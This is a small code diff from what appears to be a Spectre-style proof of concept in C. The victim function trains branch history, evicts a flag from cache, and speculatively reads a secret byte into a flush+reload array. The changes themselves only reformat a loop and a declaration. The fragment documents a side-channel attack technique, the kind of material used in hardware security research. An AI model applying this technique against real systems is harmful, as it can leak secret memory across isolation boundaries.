@@ -64,7 +64,10 @@ void victim_func(int free_index, int secret_index) {
     int* var0_dupe = attack_func(secret_index);
 
     //increase branch history for better accuracy
-    for(int i = 0; i < 100; i++) {if(i%2==0) {volatile int x = 0;} else {volatile int x = 1;}}
+    for(int i = 0; i < 100; i++) {
+        if(i%2==0)  {volatile int x = 0;}
+        else        {volatile int x = 1;}
+    }
 
     //Remove freed[0] from cache, so that the branch will speculatively execute.
     cpuid();
@@ -73,7 +76,8 @@ void victim_func(int free_index, int secret_index) {
 
     if(!freed[0]) {
         //Byte var1 (now equals secret_index) is leaked into the flush+reload array.
-        volatile cp_t cp = flush_reload_arr[SECRET[*var0]];
+        volatile cp_t cp;
+        cp = flush_reload_arr[SECRET[*var0]];
     }
 
     cpuid();
